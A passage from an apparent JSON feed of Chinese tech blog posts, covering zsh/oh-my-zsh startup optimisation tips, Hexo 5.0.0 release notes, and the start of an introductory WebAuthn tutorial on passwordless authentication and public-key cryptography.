Node.js 存在时输出 Node.js 版本」。通常情况下我们会写出以下三种条件判断方式：</p>\n<pre><code class=\"hljs bash\">[[ <span class=\"hljs-built_in\">command</span> -v node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">which</span> -a node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">type</span> node &amp;&gt;/dev/null ]] &amp;&amp; node -v</code></pre>\n<p>但是在 zsh 中，还有一种速度更快的判断命令存在的方法：</p>\n<pre><code class=\"hljs bash\">(( $+commands[node] )) &amp;&amp; node -v</code></pre>\n<p>zsh 提供了一个数组元素查找语法 <code>$+array[item]</code> （元素存在则返回 1 否则返回 0），同时 zsh 也维护了一个命令数组 <code>$commands</code>，在数组中检索元素比调用 <code>which</code>、<code>type</code>、<code>command -v</code> 命令都要快许多。</p>\n<h3>变量字符串查找</h3>\n<p>在 <code>.zshrc</code> 中鲜少需要用到这样的语法，不过依然存在一些 case，比如为了避免向 <code>$FPATH</code> 中重复添加 Homebrew 的自动补全，提前检查 <code>$FPATH</code> 中是否已经包含了 Homebrew 的路径。一般常见的写法都涉及到 <code>echo</code> 和 <code>grep</code> ：</p>\n<pre><code class=\"hljs bash\">[[ $(<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$FPATH</span> | grep <span class=\"hljs-string\">\"/usr/local/share/zsh/site-functions\"</span>) ]] &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>但是在 zsh 中我们不需要 <code>grep</code> 也可以实现同样的功能：</p>\n<pre><code class=\"hljs bash\">(( <span class=\"hljs-variable\">$FPATH</span>[(I)/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions] )) &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>zsh 内置了在变量中匹配字符串的语法：<code>$variable[(i)keyword]</code> 和 <code>$variable[(I)keyword]</code>，前者是从左往右寻找、后者是从右往左寻找，返回值为第一个匹配的首字符位置，当没有匹配时返回值则是变量的最终位置，也就是说当找不到匹配时 <code>(i)</code> 会返回字符串的长度、而 <code>(I)</code> 会返回 0。因此只需要从右往左寻找、判断返回值是否为 0 即可，搭配将数字转化为布尔值的 <code>(( ))</code> 就可以写出又快又漂亮的条件语句。</p>\n<h3>变量字符串替换</h3>\n<p>当需要截断或者替换字符串时，大部分人第一时间会想到 <code>sed</code> ，因当此需要替换变量中的字符时自然而然的会使用 <code>echo | sed</code>。比如，在 macOS 中主机名 <code>$HOST</code> 变量通常以 <code>.local</code> 结尾：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span>Sukka-MBP.local</code></pre>\n<p>如果要显示 <code>Sukka-MBP</code> （在 prompt 中常常会用到）就需要写成：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span> | sed -e <span class=\"hljs-string\">\"s/.local//\"</span>Sukka-MBP</code></pre>\n<p>但是，强大的 zsh 内置了简单的变量字符串替换语法，使用下述命令可以达到相同的效果：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/}</span>Sukka-MBP$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/.foxtail}</span>Sukka-MBP.foxtail</code></pre>\n<h2>其它优化手段</h2>\n<h3>禁用多余的插件</h3>\n<p>oh my zsh 在 Wiki 里说「Add wisely, as too many plugins slow down shell startup」。通过 profiling 可以发现一些插件（如 <code>git</code> 插件）执行耗时也不短。考虑到 oh my zsh 内置的 <code>git</code> 插件只是一些 alias、大部分我都用不到，因此将其从 <code>plugins</code> 数组中移除。</p>\n<h3>避免产生子进程</h3>\n<p>在 shell 中有不少语法会产生子进程。由于这些不受控制的子进程可能会产生其它子进程、从而导致潜在的巨大开销。常见的会产生子进程的语法有是 <code>eval</code> 和 Command substitution，在编写 <code>.zshrc</code> 时应该尽量避免使用它们。</p>\n<p>例如，Homebrew 是通过 Ruby —— 一种没有性能优势的语言编写的，而且 Homebrew 的开发者甚至因为不会翻转二叉树而错失了 Google 的 offer（想必大家大体可以猜得出 Homebrew 中的负优化），因此在 zsh 启动时产生一个子进程运行 Homebrew 将是不能忍受的，绝大部分使用 Homebrew 的人都不会改变 Homebrew 的路径，因此与其在 <code>.zshrc</code> 中使用 <code>$(brew --prefix)</code>，不如直接将命令执行的结果（<code>/usr/local</code>）直接写在 <code>.zshrc</code> 中。</p>\n<h3>启用 ZSH_DISABLE_COMPFIX</h3>\n<p>oh my zsh 内置了安全功能、避免 oh my zsh 插件使用不安全的目录和文件，但是这意味着插件在加载时需要通过一系列 security checker。通过禁用安全功能 （<code>export ZSH_DISABLE_COMPFIX=\"true\"</code>）可以使 zsh 启动速度加快 0.06s。微不足道，但值得一试。</p>\n<h2>针对 macOS 的优化</h2>\n<h3>path_helper</h3>\n<p>和 Linux 不同，在 macOS 上 zsh 启动序列的第一项为 <code>/etc/zprofile</code> 而不是 <code>~/.zprofile</code>。macOS 通过 <code>/etc/zprofile</code> 来调用 <code>path_helper</code>：</p>\n<pre><code class=\"hljs bash\">$ cat /etc/zprofile<span class=\"hljs-comment\"># System-wide .profile for sh(1)</span><span class=\"hljs-keyword\">if</span> [ -x /usr/libexec/path_helper ]; <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-built_in\">eval</span> `/usr/libexec/path_helper -s`<span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">if</span> [ <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${BASH-no}</span>\"</span> != <span class=\"hljs-string\">\"no\"</span> ]; <span class=\"hljs-keyword\">then</span>  [ -r /etc/bashrc ] &amp;&amp; . /etc/bashrc<span class=\"hljs-keyword\">fi</span></code></pre>\n<p>而 <code>path_helper</code> 又会读取 <code>/etc/paths</code> 、<code>/etc/paths/d</code>、<code>etc/manpaths</code> 和  <code>etc/manpaths.d</code>、并将其添加到 <code>$PATH</code> 和 <code>$MANPATH</code> 变量中。通过 <code>path_helper</code> macOS 提供了一种快速在不同 shell 中共享  <code>$PATH</code> 和 <code>$MANPATH</code> 的方法。过去，<code>path_helper</code> 是一个 <a href=\"https://mjtsai.com/blog/2009/04/01/slow-opening-terminal-windows\">运行速度很慢的 shell 脚本</a> 以至于有人制作了 <a href=\"https://gist.github.com/mkhl/123525\">专门的 patch</a>、甚至 <a href=\"https://github.com/mgprot/path_helper\">使用 Perl</a> 重写了一个替代品。不过 macOS 意识到了这个问题，现在 <code>path_helper</code> 不再是一个脚本而是一个预编译好的二进制文件。如果你通过 profiling 发现 <code>path_helper</code> 有在拖累 zsh 启动，那么可以考虑放弃使用 <code>/etc/paths/d</code>、而是在 <code>.zshrc</code> 中直接维护 <code>$PATH</code>。</p>\n<h3>login process</h3>\n<p>默认在启动、终端登陆 shell 时会触发 macOS 的 <code>login -fp username</code>。这一操作会调用 <code>syslog()</code> 函数向 <code>/var/log/asl</code> 写入日志、并读取上一次登录记录、以 <code>Last login</code> 的形式显示出来。你可以使用下述命令证实这一行为：</p>\n<pre><code class=\"hljs bash\">ps -ef | grep login</code></pre>\n<p>如果想要通过减少日志写入来加快 zsh 启动速度，可以修改 <code>etc/asl.conf</code> 配置文件中定义的日志等级。</p>\n<p>不少文章也提到，修改 iTerm2 设置中的 <code>Login Command</code> 为 <code>/bin/zsh</code> 可以加快 zsh 启动速度，本质上也是绕过了上述读取和写入日志的环节。</p>\n<blockquote><p>ASL 即 <strong>A</strong>pple <strong>S</strong>ystem <strong>L</strong>og，macOS 10.12 起被弃用，但是仍有系统组件在使用这一接口。</p></blockquote>\n<h2>尾声</h2>\n<p>经过一系列优化，我终于让 zsh 启动速度提升了十倍，速度甚至不亚于 fish 等以性能著称的 shell：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.14 real         0.08 user         0.05 sys        0.12 real         0.07 user         0.04 sys        0.12 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys</code></pre>\n<p>如果对我的 <code>.zshrc</code> 文件感兴趣，可以 <a href=\"https://github.com/SukkaW/dotfiles/blob/master/_zshrc/macos.zshrc\">前往 GitHub 查看我开源的 dotfiles</a>。</p>\n<div class=\"license\"> <div class=\"license-title\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">https://blog.skk.moe/post/make-oh-my-zsh-fly/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-08-10</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/make-oh-my-zsh-fly/"},{"title":"Hexo 5.0.0 正式发布","date":"2020-07-24 02:24:00","description":"\n<p>Node.js 上最快的静态站点生成器 Hexo 发布了 5.0.0 版本。作为 Hexo 核心团队成员，让我为大家介绍一下 Hexo 5.0.0 中的新特性，以及如何从 Hexo 4.x 版本升级到 Hexo 5.0.0。</p>\n<h2>新特性</h2>\n<h3>通过 npm 安装主题</h3>\n<p>过去，安装 Hexo 主题需要 <code>git clone</code> 或者下载、解压 zip；更新主题时还需要迁移 <code>_config.yml</code> 。Hexo 5.0.0 支持通过 npm 安装主题。现在安装一个主题只需要三步：</p>\n<ul>\n<li><p>使用  <code>npm install hexo-theme-[主题的名称]</code> 即可安装主题；</p></li>\n<li>\n<p>在站点的 <code>_config.yml</code> 中指定主题的名称：<br><br></p>\n<pre><code class=\"hljs yaml\"><span class=\"hljs-attr\">theme:</span> <span class=\"hljs-string\">\"[主题的名称]\"</span></code></pre>\n</li>\n<li><p>在站点根目录下新建一个文件 <code>_config.[主题的名称].yml</code>，在该文件中填入主题的配置即可。</p></li>\n</ul>\n<p>对于主题的开发者、插件开发者，以及进阶的 Hexo 用户来说，这是你们想要了解的技术细节：</p>\n<ul>\n<li>为了保证向后兼容性，Hexo 依然支持从 <code>themes/[主题的名称]</code> 目录加载主题。其中，<code>themes/[主题的名称]</code> 的优先级高于 <code>node_modules/hexo-theme-[主题的名称]</code>。也就是说，只有当 Hexo 发现 <code>themes/[主题的名称]</code> 目录不存在时，才会从  <code>node_modules/hexo-theme-[主题的名称]</code> 目录中加载主题。</li>\n<li>Hexo 5.0.0 新增了通过站点根目录下 <code>_config.[主题的名称].yml</code> 文件配置主题的功能。这是除主题目录下的 <code>_config.yml</code> 文件、以及站点配置文件的 <code>theme_config</code> 字段外第三种配置主题的方式。</li>\n<li>为保证向后兼容性，Hexo 会按照如下优先级 deep merge 三份主题配置：<code>站点配置文件的 theme_config 字段 &gt; 站点根目录下的 _config.[主题的名称].yml &gt; 主题目录下的 _config.yml</code>。因此，我们建议主题开发者尽量限制配置文件层级为 1 级，避免在 deep merge 时更深层级的配置项会被合并而不是被覆盖。</li>\n</ul>\n<h3>PrismJS 代码高亮支持</h3>\n<p>Hexo 5.0.0 新增了 PrismJS 代码高亮支持。</p>\n<p>相比 highlight.js 可以在 Node.js 环境执行（即：可在 Hexo 生成页面时进行代码高亮）不同，PrismJS 是一个轻量级的代码高亮库，绝大部分插件都依赖浏览器中执行。Hexo 为了尽可能兼容 PrismJS 的功能和插件，提供了「生成时渲染」和「浏览器渲染」两种模式：前者只需在主题之中引入 PrismJS 的 CSS 即可，但是无法使用大部分 PrismJS 的插件；后者需要在主题中同时引入 PrismJS 的 CSS 和 <code>prism.js</code>，但是可以兼容 PrismJS 大部分插件。</p>\n<p>关于 Hexo 主题的开发者适配 Hexo 的两种代码高亮的技术细节，我们专门撰写了 <a href=\"https://hexo.io/docs/syntax-highlight\">相关的文档页面</a> 以供参考。</p>\n<h3>静态 HTML 片段插入</h3>\n<p>插件开发者经常需要在页面中插入 HTML 片段：播放器插件需要往页面中插入 <code>player.css</code> 和 <code>player.js</code>，lazyload 插件的作者需要往页面中插入 <code>lazyload.js</code>，Live2D 插件的作者需要往页面中插入对应的 CSS 和 JS，等等。Hexo 5.0.0 新增了一个插件 API 接口 <code>Injector</code>，用于往页面的 <code>&lt;head&gt;</code> 和 <code>&lt;body&gt;</code> 标签中注入静态 HTML 片段。这一功能支持：</p>\n<ul>\n<li>在 <code>&lt;head&gt;</code> 之后、<code>&lt;/head&gt;</code> 之前、<code>&lt;body&gt;</code> 之后 和 <code>&lt;/body&gt;</code> 之前四个位置插入代码。</li>\n<li>支持只在特定页面注入 HTML 片段 —— 插件开发者可以仅往文章页面插入 HTML 片段而不影响其他页面如首页和归档。</li>\n</ul>\n<p>插件开发者请参考 Hexo 的 [Injector API 文档] 了解具体使用方法。</p>\n<h3>其他新特性</h3>\n<p>除上述三个重磅功能外，Hexo 还新增了其他功能，如：</p>\n<ul>\n<li>标签插件 API 新增 <code>unregister</code>å 方法</li>\n<li>\n<code>tagcloud</code> 辅助函数新增支持自定义 class 属性和 level</li>\n<li>\n<code>feed_tag</code> 辅助函数增加对 hexo-generator-feed 插件的兼容</li>\n<li>\n<code>youtube</code> 标签插件新增对 YouTube 播放列表的支持，以及可选使用 <code>www.youtube-nocookie.com</code> 域名</li>\n<li>\n<code>post_link</code> 标签插件在找不到对应文章时将会显示警告信息</li>\n<li>\n<code>post_permalink</code> 配置项新增支持 <code>:second</code> 属性</li>\n<li>当文章的标签插件出现渲染错误时，报错信息将会显示出错文件的路径</li>\n</ul>\n<h2>修复的 Bug</h2>\n<ul>\n<li>修复了 数个相邻的标签插件 无法渲染的 Bug</li>\n<li>修复了 文章中的代码块由于包含大括号（<code>{</code> 和 <code>}</code>）导致的渲染失败</li>\n<li>修复了 包含 Source Map 的 Hexo 插件无法加载的 Bug</li>\n<li>修复了 <code>code</code> 标签插件无法解析 <code>wrap</code> 选项的问题</li>\n<li>当 <code>post_asset_folder</code> 功能启用时，<code>hexo new</code> 命令将不再生成错误的 <code>index</code> 目录</li>\n</ul>\n<h2>性能改进</h2>\n<p>一如既往，Hexo 5.0.0 也带来了一系列性能改进，以提升 Hexo 的渲染性能。</p>\n<ul>\n<li>改进了标签插件的渲染性能</li>\n<li>优化了 <code>meta[generator]</code> 标签注入的逻辑</li>\n<li>优化为外部链接添加 <code>rel=noopenner</code> 和 <code>target=\"_blank\"</code> 功能的性能</li>\n<li>确保 <code>after_render:html</code> Filter 在每个页面只执行一次</li>\n<li>优化了 Filter API 的执行速度</li>\n<li>延迟加载代码高亮，减少 Hexo 启动用时</li>\n<li>当执行 <code>hexo clean</code> 时不再加载无关的插件</li>\n</ul>\n<h2>从 Hexo 4.x 升级到 Hexo 5.x</h2>\n<p>Hexo 5.0.0 引入了少数不向后兼容的功能，因此当你升级到 Hexo 5.0.0 时，需要遵循以下步骤进行迁移：</p>\n<h3>升级 Node.js</h3>\n<p>Hexo 5.0.0 不再支持 Node.js 8 及更低版本。为了使用 Hexo 5.0.0，请确保 Node.js 版本不低于 10.13.0。</p>\n<h3>文章 Front-Matter 不再支持 keywords 字段</h3>\n<p>过去这一字段被主要用于 <code>open_graph</code> 辅助函数。升级到 Hexo 5.0.0 后你无需去除现有文章的 Front-Matter 中的 <code>keywords</code> 字段，但这一字段将不会再起任何作用。</p>\n<h3>文章 Front-Matter 中 permalink 字段的行为</h3>\n<p>Hexo 5.0.0 修改了在文章的 Front Matter 中指定 <code>permalink</code> 字段的行为，与独立页面的 <code>permalink</code> 的行为一致。</p>\n<h3>全局变量中不再包含 Lodash</h3>\n<p>Hexo 5.0.0 去除了全局变量中的 Lodash，因此主题无法继续在模板中使用 Lodash。主题开发者应该遵循 <a href=\"https://github.com/you-dont-need/You-Dont-Need-Lodash-Underscore\">You-Dont-Need-Lodash-Underscore</a> 进行迁移。</p>\n<h3>用 updated_option 配置代替 use_date_for_updated</h3>\n<p>Hexo 4.0.0 提供的 <code>use_date_for_updated</code> 配置项现已被 <code>updated_option</code> 替代。</p>\n<ul>\n<li>\n<code>use_date_for_updated: true</code> 现在等价于 <code>updated_option: 'date'</code>。</li>\n<li>\n<code>use_date_for_updated: false</code> 现在等价于 <code>updated_option: 'mtime'</code>。</li>\n</ul>\n<div class=\"license\"> <div class=\"license-title\">Hexo 5.0.0 正式发布</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hexo-5/\">https://blog.skk.moe/post/hexo-5/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-07-24</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hexo-5/"},{"title":"谈谈 WebAuthn","date":"2020-03-23 14:57:59","description":"\n<p>WebAuthn，即 Web Authentication，是一个用于在浏览器上进行认证的 API，W3C 将其表述为 “An API for accessing Public Key Credentials”，即“一个用于访问公钥凭证的 API”。WebAuthn 很强大，强大到被认为是 Web 身份认证的未来（当然，也很复杂）。你有想过通过指纹或者面部识别来登录网站吗？WebAuthn 就能在保证安全和隐私的情况下让这样的想法成为现实。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/wwa.gif\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/wwa.gif?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"通过 WebAuthn 调起 Windows Hello 登录网站\" width=\"1912\" height=\"966\" class=\"aligncenter size-full wp-image-2215\"></a>\n<p>你可以在<a href=\"https://webauthn.io/\" rel=\"noopener\">这个网站</a>自行体验 WebAuthn。或者，如果你有一个使用 WordPress 的站点，可以尝试一下 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WP-WebAuthn</a> 这款插件，它可以为你的站点启用 WebAuthn 登录。这是我为了写这篇文章而练手开发的插件，本文中的部分示例代码也来自这款插件。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"wp-webauthn\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/wp-webauthn\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>WebAuthn Level 1 标准已在 2019 年 3 月成为 W3C 推荐标准，而 Level 2 标准目前也已进入编辑草案阶段，但互联网上有关它的中文资料却仍然很少，国内也鲜有网站支持这一新标准。于是，在抱着各种英文资料和标准啃了几天以后，我折腾出了这篇文章。</p>\n<p>在这篇文章里，我将会从最基本的概念开始，逐渐深入 WebAuthn，直到解码公钥等深层细节。这可能是你能找到的有关 WebAuthn 最详细最基础的中文文章，也很可能是最长的。在开始之前，<strong>我强烈建议你打开菜单中的文章目录浏览一遍，以对这篇文章涉及的内容有所了解。</strong>如果你只是想了解如何简单地在你的项目中添加对 WebAuthn 的支持，那么“<a href=\"https://flyhigher.top/#webauthn-overview\">浅谈 WebAuthn</a>”部分就是你要找的；如果你想了解更多关于 WebAuthn 的底层细节，那么你可以继续阅读“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”部分。</p>\n<p>由于在本文写作时 WebAuthn Level 2 规范尚未定稿，<strong>这篇文章我们将只专注于 Level 1 规范。</strong></p>\n<p>这篇文章最后更新于 2020.9 ，在你读到这篇文章时，部分事实可能已经发生改变，请注意判断。</p>\n<p><strong>更新日志：</strong></p>\n<ul>\n<li>2021.1.16 添加 Chrome 开发工具信息</li>\n<li>2020.9.17 更新 iOS/iPad OS 兼容性信息</li>\n<li>2020.5.20 添加部分无用户名认证的平台兼容性内容</li>\n<li>2020.5.15 添加部分 <code>extensions</code> 相关内容与链接；添加全局凭证 ID 唯一内容；添加凭证 ID 查找相关内容；添加“从 U2F 认证迁移”一节</li>\n<li>2020.4.13 更新与修正 <code>userVerification</code> 相关内容；添加部分 Firefox 相关内容</li>\n<li>2020.3.23 文章发布</li>\n</ul>\n<p>那么让我们开始吧。<span></span></p>\n<h1>浅谈 WebAuthn</h1>\n<p>在这个部分里，我们将会从基础概念开始，了解有关 WebAuthn 和密码学的一些基础知识，并最终使用第三方库实现基础的 WebAuthn 认证。如果你已经对这些内容有所了解了，可以跳到“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”继续阅读。</p>\n<h2>为什么使用 WebAuthn</h2>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/2.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"钓鱼邮件\" width=\"709\" height=\"693\" class=\"aligncenter size-full wp-image-2162\"></a>\n<p>相信你一定收到过类似的邮件吧？只要你点进那个最显眼的链接，你就会进入一个设置好的圈套——钓鱼网站。如果你一时糊涂在这类网站上填写了你的账号和密码，bingo，你的账号就不再是你的账号了。</p>\n<p>不过，就算你警惕心再强，也无法避免密码泄露事件。Twitter, Facebook 等都爆出过明文密码泄露事件，证明再大的公司或组织也无法避免密码泄露问题。雪上加霜的是，很大一部分用户都非常喜欢使用重复密码，这就导致一次密码泄露会牵连很多网站，用户的账户安全性完全无法得到保证。</p>\n<p>那么，有什么办法解决这些问题吗？<strong>彻底解决的方法只有一个，那就是抛弃密码。</strong>可是没有密码还怎么验证用户身份呢？这就是 WebAuthn 的用武之地了。</p>\n<p><del>没有密码的好时代，来临力！</del></p>\n<h2>什么是 WebAuthn</h2>\n<p>那么到底什么是 WebAuthn 呢？如开头所说，WebAuthn 是“一个用于访问公钥凭证的 API”，网站可以通过这个 API 进行一些高安全性的身份验证。WebAuthn 一个最常见的应用就是用于网站登录时的 2FA（双重因素验证）甚至是无密码登录。通过网页调用 WebAuthn，在不同平台下，<strong>我们可以实现通过 USB Key、指纹、面部甚至虹膜扫描来认证身份，同时确保安全和隐私。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/4-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/4-3.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"WebAuthn 可使用的各种身份认证方式\" width=\"1294\" height=\"566\" class=\"aligncenter size-full wp-image-2213\"></a>\n<p>WebAuthn 标准是 FIDO2 标准的一部分，而 FIDO2 则是由 FIDO 联盟和 W3C 共同推出的 U2F（现称作 FIDO1）的后继标准，旨在增强网络认证的安全性。</p>\n<blockquote><p>你可能了解过 U2F，那么 U2F 和 FIDO2 的区别在哪里呢？从名字上可以看出，U2F，即“通用第二因素协议”，是专注于作为密码后的第二道屏障的，而 FIDO2 增加了单因素认证功能，这意味着使用 FIDO2 可以完全替代密码，真正实现无密码登录。</p></blockquote>\n<p>FIDO2 标准主要包括四个部分，其一是用于网站和访客设备交互的 WebAuthn，而 Client to Authenticator Protocol 2（CTAP2，客户端-认证器协议）作为 WebAuthn 的补充，则是用于访客的设备和认证器交互的协议。标准的其他两个部分则是 U2F 和 UAF 规范。在这篇文章中，我们只关心 WebAuthn，不会涉及 CTAP, U2F 和 UAF 的相关知识。如果你对这段话中的一些概念不了解，不要紧张，接下来我们就来谈谈 WebAuthn 中一些常用的术语和概念。</p>\n<blockquote><p>WebAuthn 只能在安全上下文中使用，也就是说，页面需要使用 HTTPS 协议或是处于 <code>localhost</code> 中。</p></blockquote>\n<h2>常用术语和概念</h2>\n<p>WebAuthn 中有许多不常碰到的术语，不过我只会在这里介绍一些常用的术语和概念——如果你只是希望做出一个简单的实现，那么了解这一段中的一些概念就足够了。同时，由于我实在没能找到一部分术语的通用翻译，有一些术语我按着自己的理解尽可能地翻译了，有任何问题请告诉我。</p>\n<p>在一个完整的 WebAuthn 认证流程中，通常有这么几个角色：</p>\n<ul>\n<li>Relying Party 依赖方 (RP) ：指服务提供方，即网站</li>\n<li>User 用户：正准备登录的你</li>\n<li>Authenticator 认证器：通常指 USB Key 或是设备内置的指纹扫描器、虹膜扫描器、面部识别装置等，正是它们在使用流程中代替了密码甚至是用户名</li>\n<li>User Agent 用户代理：通常指浏览器或系统，负责与认证器交互</li>\n</ul>\n<p>认证过程通常分为两种：</p>\n<ul>\n<li>Registration Ceremony 注册仪式：用户向账户上添加认证器</li>\n<li>Authentication Ceremony 验证仪式：用户通过已注册的认证器验证身份</li>\n</ul>\n<p>同时，认证过程中还会产生这些内容：</p>\n<ul>\n<li>Challenge 挑战：通常是一串随机字符串</li>\n<li>Public Key Credential 公钥凭证：由认证器产生的凭证，在技术上代替了密码</li>\n<li>Attestation 证明：注册时认证器产生的验证数据</li>\n<li>Assertion 断言：验证时认证器产生的验证数据</li>\n</ul>\n<blockquote><p><strong>请注意区分证明 (Attestation) 和断言 (Assertion)</strong>，特别是在这两个单词有些相似的情况下。在 WebAuthn 中，它们是不同过程中的类似概念，但并不相同。</p></blockquote>\n<p>如果你对于这些内容不是很理解，没有关系，我们会在“<a href=\"https://flyhigher.top/#how-to-webauthn\">使用流程</a>”一节中将这些概念放到实际情况中解释，你只要先区分这些概念即可。</p>\n<h2>安全性的基础</h2>\n<p>WebAuthn 为什么安全？和 HTTPS 一样，WebAuthn 使用非对称加密的思路来保证安全性，但侧重点又有所不同。要理解 WebAuthn 的认证流程，我们必须对非对称加密有所了解。如果你对非对称加密比较熟悉了，就直接跳到下一段吧。</p>\n<p>WebAuthn 的核心在于“认证”，即保证产生了凭证的认证器是用户的认证器，而不是第三方在伪造凭证。但为什么要使用非对称加密呢？我们可以先来看看对称加密。</p>\n<p>让我们假设小明和小红相互写信，见不到对方。这天小红突然想，给自己写信的人是不是真的小明呢？于是小红要求对方向小红证明自己是小明。怎么证明呢？他们商量出来这么一套方案：</p>\n<ol>\n<li>在小明的身份已经验证的情况下，小明和小红商量一个统一的密码和密钥</li>\n<li>一段时间后，在小红要求小明验证身份时，小红发送一段文本给小明</li>\n<li>小明用提前和小红商量好的密码和密钥加密文本后发回给小红</li>\n<li>小红使用相同的密码和密钥解密文本，如果得到文本和之前发送的一致，就表明对方拥有正确的密码和密钥</li>\n</ol>\n<blockquote><p>在密码学中，我们通常把“加密算法”称为密码 (code)，和通常登录时用的密码 (password) 并非同一个概念。</p></blockquote>\n<p>在这种情况下，<strong>只要密钥不泄露</strong>，即拥有正确密钥的只有小明和小红，那么小红就能确定对方一定是小明。但这样的问题也很明显，如果小明和小红不能见面，那么他们就必须先以明文交换密码——<strong>在这个过程中一旦有人窃取到了密码，这个认证就无效了。</strong></p>\n<p>这时我们就需要使用<strong>非对称加密</strong>来拯救破碎的信任了。非对称加密的基础是一对密钥，也就是公钥和私钥，它们是互相关联但（几乎）无法互相推导的。在非对称加密的过程中，选择相同的密码后，使用私钥加密明文得到的密文只能由对应的公钥解密，无法使用私钥解密，同时这个过程反过来也是成立的。</p>\n<blockquote><p>本文的核心并不是非对称加密算法，因此不会详述非对称加密在数学上的证明，若有兴趣可以自行了解。</p></blockquote>\n<p>这就完美解决密钥泄露的问题了。让我们回过头来看之前的例子。现在小明和小红决定使用非对称加密来证明身份，过程如下：</p>\n<ol>\n<li>在小明的身份已经验证的情况下，小明提前生成一对公私钥，将公钥发送给小红，私钥自己保管，同时商量好统一的密码</li>\n<li>一段时间后，在小红要求小明验证身份时，小红发送一段文本给小明</li>\n<li>小明使用商量好的密码和自己的私钥加密文本，发送给小红</li>\n<li>小红使用相同的密码和小明的公钥解密文本，如果得到文本和之前发送的一致，就表明对方拥有正确的密码和私钥</li>\n</ol>\n<p>在这种情况下，<strong>只要私钥不泄露</strong>，那么小红解密得到的文本和之前发送的一致，那么就可以证明收到的密文一定是由小明加密后发送过来的。而在整个过程中，私钥都没有离开过小明，更没有经过传输，也就几乎没有泄露的可能了。这时，小红终于可以确定对面和她通信的人的确是小明了。</p>\n<p>题外话：HTTPS 虽然也应用了非对称加密，但 HTTPS 更侧重于“加密”而非“认证”，因此思路上会有些许差异。要了解关于 HTTPS 和非对称加密的更多信息，你可以阅读我之前写的这篇文章：</p>\n<p></p>\n<div class=\"mdx-post-cot\" data-mdxposturl=\"https://flyhigher.top/develop/1093.html\"><div class=\"mdx-post-wait-out-c2\"><div class=\"mdx-post-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://flyhigher.top/develop/1093.html\"><div 